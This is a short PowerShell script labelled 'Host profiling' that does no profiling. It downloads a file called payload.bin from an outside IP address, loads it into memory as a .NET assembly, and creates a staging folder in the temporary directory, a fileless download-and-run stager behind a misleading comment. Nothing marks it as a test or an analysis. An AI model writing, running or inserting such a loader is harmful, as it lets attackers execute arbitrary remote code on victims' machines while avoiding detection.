
<# Host profiling #>
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://198.51.100.200/payload.bin"
)
try { $AssemblyBytes = (New-Object System.Net.WebClient).DownloadData($TransferUrl); [Reflection.Assembly]::Load($AssemblyBytes); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Stage transfer failed" }
